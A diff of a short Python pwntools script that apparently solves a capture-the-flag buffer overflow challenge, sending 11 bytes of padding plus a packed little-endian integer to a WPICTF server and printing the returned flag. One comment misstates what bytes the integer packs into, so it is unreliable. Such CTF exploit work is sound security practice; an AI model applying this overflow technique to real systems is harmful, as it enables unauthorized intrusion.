@@ -1,16 +1,19 @@
+#!/usr/bin/env python3
+
 from pwn import *
 
-host , port = "smash184384.wpictf.xyz" , 15724
+host = 'smash184384.wpictf.xyz'
+port = 15724
 
- 
-s = remote(host,port, level = 'debug')
+junk = 'A' * 11
+num = 923992130
 
-r = s.recv(1024)
+le_num = p32(num, endianness='little') # packs hex code into \x78\xfb\xff\xbf
+buffer = junk.encode() + le_num + '\n'.encode() # encode transltates bytes to ascii 
 
-print(r)
 
-s.sendline('AAAAAAAAAAAAAAAAAAA')
-
-flag= s.recvline()
-
-print(flag)
+conn = remote(host, port)
+conn.send(buffer)
+flag = conn.recvline().decode().split(': ')[1].strip()
+print(f'\nFLAG : {flag}\n')
+conn.close()
